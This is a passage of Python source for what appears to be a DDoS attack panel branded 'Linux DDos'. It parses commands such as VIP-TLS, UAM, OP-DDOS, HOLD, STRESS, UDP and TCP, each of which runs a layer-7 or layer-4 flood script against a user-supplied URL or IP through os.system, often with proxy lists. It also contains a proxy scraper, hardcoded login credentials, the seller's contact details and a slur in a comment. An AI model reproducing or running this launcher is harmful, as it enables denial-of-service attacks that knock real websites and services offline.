╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [VIP-TLS]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node naruto.js {url} 100 1024 {time}')
            except IndexError:
                print('Usage: VIP-TLS <url> <time>')
                print('Example: VIP-TLS http://example.com 60')    
               
      
                       
        elif "UAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [UAM]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node UAM.js {url} {time} 512 100 proxy.txt')
            except IndexError:
                print('Usage: UAM <url> <time>')
                print('Example: UAM http://example.com 60')        
                

        elif "HTTP" in cnc:
            try:
                url = cnc.split()[1]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [HTTP]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && go run main.go 50 100000 {url}')
            except IndexError:
                print('Usage: HTTP <url>')
                print('Example: HTTP http://example.com')                

        elif "SPIKE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [SPIKE]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node SPIKE.js {url} 100 {time}')
            except IndexError:
                print('Usage: SPIKE <url> <time>')
                print('Example: SPIKE http://example.com 60')          
  
        elif "OP-DDOS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [OP-DDOS]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node bypass.js {url} {time} 35 10 proxy.txt')
            except IndexError:
                print('Usage: OP-DDOS <url> <time>')
                print('Example: OP-DDOS http://example.com 60')                          
                                            
        elif "HOLD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [HOLD]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node HOLD.js {url} {time} 512 100 proxy.txt')
            except IndexError:
                print('Usage: HOLD <url> <time>')
                print('Example: HOLD http://example.com 60')
                

                              
        elif "KOCAK" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [KOCAK]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node https.js {url} {time} 120 35 10 proxy.txt bypas')
            except IndexError:
                print('Usage: KOCAK <url> <time>')
                print('Example: KOCAK http://example.com 100')            

                
        elif "GOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [GOOD]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "red", "red")
                os.system(f'cd L7 && node tlsv6.js {url} {time} 35 7 proxy.txt')
            except IndexError:
                print('Usage: GOOD <url> <time>')
                print('Example: GOOD http://example.com 60')        



                
        elif "TOP-TLS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [TOP-TLS]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node tls-gg.js {url} {time} 109 11 proxy.txt')
            except IndexError:
                print('Usage: TOP-TLS <url> <time>')
                print('Example: TOP-TLS http://example.com 60')        
	
        elif "ALOK" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [ALOK]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node alok.js {url} {time} 35 7 proxy.txt')
            except IndexError:
                print('Usage: ALOK <url> <time>')
                print('Example: ALOK http://example.com 60')        				
				
# LAYER 4 METHODS

        elif "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + ip + ''']
    Port: [''' + port + ''']
    Time: [''' + time + ''']
    Methods: [STRESS]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L4 && go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: STRESS <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        elif "UDP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + ip + ''']
    Port: [''' + port + ''']
    Time: [''' + time + ''']
    Methods: [UDP]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L4 && python3 STRL4.py {ip} {port} {time}')
            except IndexError:
                print('Usage: UDP2 <ip> <port> <time>')
                print('Example: UDP2 4 1.1.1.1 443 120')

        elif "TCP" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                port = cnc.split()[3]
                os.system(f'cd L4 && node TCP.js {url} {time} {port}')
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Port: [''' + time + ''']
    Time: [''' + port + ''']
    Type: [TCP]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
            except IndexError:
                print('Usage: TCP <ip> <time> <port>')
                print('Example: TCP 1.1.1.1 60 443')

# TOOLS

        elif "PAPING" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + ip + ''']
    Port: [''' + port + ''']
    Time: [''' + time + ''']
    Type: [PAPING]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
            except IndexError:
                print('Usage: paping <ip> <port> <time>')
                print('Example: paping 1.1.1.1 443 120')

        elif "PROXY" in cnc:
            try:
                os.system(f'python3 scrape.py')
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                print("Scraping The Proxy!!!")
            except IndexError:
                print('Usage: PROXY')
                print('Example: PROXY')
  
        elif "Install" in cnc:
            try:
                os.system(f'python3 installer.py')
            except IndexError:
                print('Usage: INSTALL')
                print('Example: INSTALL')                
#only niggs dont understand
        elif "Help" in cnc:
            print(f'''         
» Methods : To show methods 
» Clear: To clear all messages
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                
                
def owner():
	clear()
	logo()
	print("""

OWNER : SukaLebok06
A.K.A : STRET JAWA & KUZO TAMVAN KATA MAMAH
Official Channel : t.me/PROOFC2
Thank youu Love you ALL
""")
                
def report():
	clear()
	logo()
	print("""

INDO (ID)
JIKA KAMU INGIN MELAPORKAN BUG

INGGRIS (IG)
If You Found Bug In Tools/methods Report To Owner

Telegram
t.me/kyymotherfucker
t.me/Stretzx

WhatsApp 
SukaLebok06  : +6289518439944

Owner Care With Customer

""")


# LOG-IN

def login():
    clear()
    user = "SukaLebok06"
    passwd = "c2"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to Linux DDos")
        time.sleep(0.3)
        main()

login()
